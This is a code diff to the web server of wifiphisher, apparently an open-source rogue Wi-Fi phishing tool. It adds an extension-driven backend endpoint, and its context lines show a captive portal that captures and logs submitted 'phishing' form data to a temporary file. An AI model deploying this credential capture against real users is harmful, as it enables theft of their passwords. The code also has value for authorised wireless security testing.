@@ -1,7 +1,11 @@
 import logging
+import json
+from tornado.escape import json_decode
 import tornado.ioloop
 import tornado.web
 import os.path
+import wifiphisher.common.uimethods as uimethods
+import wifiphisher.common.extensions as extensions
 from wifiphisher.common.constants import *
 
 hn = logging.NullHandler()
@@ -18,6 +22,49 @@ class DowngradeToHTTP(tornado.web.RequestHandler):
 
     def get(self):
         self.redirect("http://10.0.0.1:8080/")
+
+
+class BackendHandler(tornado.web.RequestHandler):
+    """
+    Validate the POST requests from client by the uimethods
+    """
+
+    def initialize(self, em):
+        """
+        :param self: A tornado.web.RequestHandler object
+        :param em: An extension manager object
+        :type self: tornado.web.RequestHandler
+        :type em: ExtensionManager
+        :return: None
+        :rtype: None
+        """
+
+        self.em = em
+
+    def post(self):
+        """
+        :param self: A tornado.web.RequestHandler object
+        :type self: tornado.web.RequestHandler
+        :return: None
+        :rtype: None
+        ..note: overide the post method to do the verification
+        """
+
+        json_obj = json_decode(self.request.body)
+        response_to_send = {}
+        backend_methods = self.em.get_backend_funcs()
+        # loop all the required verification methods
+        for func_name in list(json_obj.keys()):
+            if func_name in backend_methods:
+                # get the correspondsing callback
+                callback = getattr(backend_methods[func_name],
+                                   func_name)
+                # fire the corresponding varification method
+                response_to_send[func_name] = callback(json_obj[func_name])
+            else:
+                response_to_send[func_name] = "NotFound"
+
+        self.write(json.dumps(response_to_send))
 
 
 class CaptivePortalHandler(tornado.web.RequestHandler):
@@ -65,8 +112,8 @@ class CaptivePortalHandler(tornado.web.RequestHandler):
         global terminate
 
         # check if this is a valid phishing post request
-        if self.request.headers["Content-Type"].startswith(VALID_POST_CONTENT_TYPE):
-
+        if self.request.headers["Content-Type"].startswith(
+                VALID_POST_CONTENT_TYPE):
             post_data = tornado.escape.url_unescape(self.request.body)
             # log the data
             log_file_path = "/tmp/wifiphisher-webserver.tmp"
@@ -78,16 +125,23 @@ class CaptivePortalHandler(tornado.web.RequestHandler):
             terminate = True
 
 
-def runHTTPServer(ip, port, ssl_port, t):
+def runHTTPServer(ip, port, ssl_port, t, em):
     global template
     template = t
+
+    # Get all the UI funcs and set them to uimethods module
+    for f in em.get_ui_funcs():
+        setattr(uimethods, f.__name__, f)
+
     app = tornado.web.Application(
         [
-            (r"/.*", CaptivePortalHandler)
+            (r"/backend/.*", BackendHandler, {"em": em}),
+            (r"/.*", CaptivePortalHandler),
         ],
         template_path=template.get_path(),
         static_path=template.get_path_static(),
-        compiled_template_cache=False
+        compiled_template_cache=False,
+        ui_methods=uimethods
     )
     app.listen(port, address=ip)
 
